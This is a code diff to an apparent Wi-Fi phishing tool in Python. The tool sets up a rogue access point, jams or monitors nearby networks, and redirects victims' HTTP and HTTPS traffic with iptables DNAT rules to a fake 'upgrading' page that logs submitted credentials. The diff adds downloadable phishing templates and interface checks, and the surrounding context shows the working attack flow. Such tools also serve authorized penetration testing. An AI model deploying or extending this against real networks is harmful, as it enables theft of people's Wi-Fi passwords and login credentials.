@@ -18,6 +18,7 @@ from subprocess import Popen, PIPE, check_output
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+import phishingpage
 
 conf.verb = 0
 
@@ -25,7 +26,8 @@ conf.verb = 0
 PORT = 8080
 SSL_PORT = 443
 PEM = 'cert/server.pem'
-PHISING_PAGE = "phishing-scenarios/minimal"
+TEMPLATE_NAME = "minimal"
+TEMPLATE_PATH = ""
 POST_VALUE_PREFIX = "wfphshr"
 NETWORK_IP = "10.0.0.0"
 NETWORK_MASK = "255.255.255.0"
@@ -231,7 +233,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                                )
                 log_file.close()
             self.path = "index.html"
-        self.path = "%s/%s" % (PHISING_PAGE, self.path)
+        self.path = "%s/%s" % (TEMPLATE_PATH, self.path)
 
         if self.path.endswith(".html"):
             if not os.path.isfile(self.path):
@@ -271,7 +273,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                                    W + "\n"
                                    )
                     log_file.close()
-        if redirect == True:
+        if redirect:
             self.redirect("/upgrading.html")
             terminate = True
             return
@@ -345,7 +347,7 @@ def get_iface(mode="all", exceptions=["_wifi"]):
 def reset_interfaces():
     monitors = get_interfaces()["monitor"]
     for m in monitors:
-        if 'mon' in m:
+        if 'mon' in m and os.path.isfile('/usr/sbin/airmon-ng'):
             Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
         else:
             Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
@@ -380,10 +382,8 @@ def get_internet_interface():
 
 def channel_hop(mon_iface):
     chan = 0
-    err = None
     while hop_daemon_running:
         try:
-            err = None
             if chan > 11:
                 chan = 0
             chan = chan + 1
@@ -403,6 +403,7 @@ def channel_hop(mon_iface):
                             'interface (e.g. wlan0)\n'
                             'from the network if you have not already\n'
                         )
+                        sys.exit(err)
                     break
             time.sleep(1)
         except KeyboardInterrupt:
@@ -519,10 +520,10 @@ def dhcp(dhcpconf, mon_iface):
     proc = check_output(['ifconfig', str(mon_iface)])
     if NETWORK_GW_IP not in proc:
         return False
-    time.sleep(.5) # Give it some time to avoid "SIOCADDRT: Network is unreachable"
+    time.sleep(.5)  # Give it some time to avoid "SIOCADDRT: Network is unreachable"
     os.system(
-        ('route add -net %s netmask %s gw %s' % 
-        (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
+        ('route add -net %s netmask %s gw %s' %
+         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
     )
     return True
 
@@ -570,7 +571,6 @@ def channel_hop2(mon_iface):
     global monchannel, first_pass
 
     channelNum = 0
-    err = None
 
     while 1:
         if args.channel:
@@ -596,6 +596,7 @@ def channel_hop2(mon_iface):
                     # iw dev shouldnt display output unless there's an error
                     err = ('[' + R + '-' + W + '] Channel hopping failed: '
                            + R + line + W)
+                    sys.exit(err)
 
         output(monchannel)
         if args.channel:
@@ -872,15 +873,53 @@ if __name__ == "__main__":
     # Are you root?
     if os.geteuid():
         sys.exit('[' + R + '-' + W + '] Please run as root')
+    # Kill any possible programs that may interfere with the wireless card
+    # Only for systems with airmon-ng installed
+    if os.path.isfile('/usr/sbin/airmon-ng'):
+        proc = Popen(['airmon-ng', 'check', 'kill'], stdout=PIPE, stderr=DN)
+
     # Get hostapd if needed
     get_hostapd()
+
+    # get template_database
+    template_database = phishingpage.get_template_database()
+
+    # check to see if the template is local
+    if (phishingpage.exists(TEMPLATE_NAME) and
+            (not template_database[TEMPLATE_NAME] is None)):
+        # if template is incomplete locally, delete and ask for a download
+        if not phishingpage.check_template(TEMPLATE_NAME):
+
+            # clean up the previous download
+            phishingpage.clean_template(TEMPLATE_NAME)
+
+            # get user's response
+            response = raw_input("Template is available online. Do you want to "\
+            "download it now? [y/n] ")
+
+            # in case the user agrees to download
+            if response == "Y" or response == "y":
+                # display download info to the user
+                print "[" + G + "+" + W + "] Downloading the template..."
+
+                # download the content
+                phishingpage.grab_online(TEMPLATE_NAME)
+
+    # set the path for the template
+    TEMPLATE_PATH = phishingpage.get_path(TEMPLATE_NAME)
 
     # TODO: We should have more checks here:
     # Is anything binded to our HTTP(S) ports?
     # Maybe we should save current iptables rules somewhere
-
-    # Get interfaces
     reset_interfaces()
+    # Exit if less than two wireless interfaces exist in the system
+    if len(get_interfaces()['all']) <= 0:
+        sys.exit('[' + R + '-' + W + '] No wireless interfaces ' \
+               + 'found. Closing... ')
+    elif len(get_interfaces()['all']) == 1:
+        sys.exit('[' + R + '-' + W + '] Only one wireless interface ' \
+               + 'found. Closing... ')
+    # Get the right interfaces
     inet_iface = get_internet_interface()
     if not args.jamminginterface:
         mon_iface = get_iface(mode="monitor", exceptions=[inet_iface])
@@ -893,12 +932,6 @@ if __name__ == "__main__":
             iface_to_monitor = args.jamminginterface
         else:
             iface_to_monitor = get_strongest_iface()
-        if not iface_to_monitor and not inet_iface:
-            sys.exit(
-                ('[' + R + '-' + W +
-                 '] No wireless interfaces found, bring one up and try again'
-                 )
-            )
         mon_iface = start_mode(iface_to_monitor, "monitor")
     wj_iface = mon_iface
     if not args.apinterface:
@@ -908,13 +941,12 @@ if __name__ == "__main__":
 
     if inet_iface and inet_iface in [ap_iface, iface_to_monitor]:
         sys.exit(
-            ('[' + G + '+' + W + 
-            '] Interface %s is connected to the Internet. ' % inet_iface +
-            'Please disconnect and rerun the script.\n' +
-            '[' + R + '!' + W + '] Closing'
-            )
+            ('[' + G + '+' + W +
+             '] Interface %s is connected to the Internet. ' % inet_iface +
+             'Please disconnect and rerun the script.\n' +
+             '[' + R + '!' + W + '] Closing'
+             )
         )
-
 
     '''
     We got the interfaces correctly at this point. Monitor mon_iface & for
@@ -922,12 +954,12 @@ if __name__ == "__main__":
     '''
     # Set iptable rules and kernel variables.
     os.system(
-        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s' 
-        % (NETWORK_GW_IP, PORT))
+        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'
+         % (NETWORK_GW_IP, PORT))
     )
     os.system(
-        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s' 
-        % (NETWORK_GW_IP, SSL_PORT))
+        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'
+         % (NETWORK_GW_IP, SSL_PORT))
     )
     Popen(
         ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
@@ -950,8 +982,9 @@ if __name__ == "__main__":
     start_ap(ap_iface, channel, essid, args)
     dhcpconf = dhcp_conf(ap_iface)
     if not dhcp(dhcpconf, ap_iface):
-        print('[' + G + '+' + W + 
-            '] Could not set IP address on %s!' % ap_iface)
+        print('[' + G + '+' + W +
+              '] Could not set IP address on %s!' % ap_iface
+              )
         shutdown()
     os.system('clear')
     print ('[' + T + '*' + W + '] ' + T +
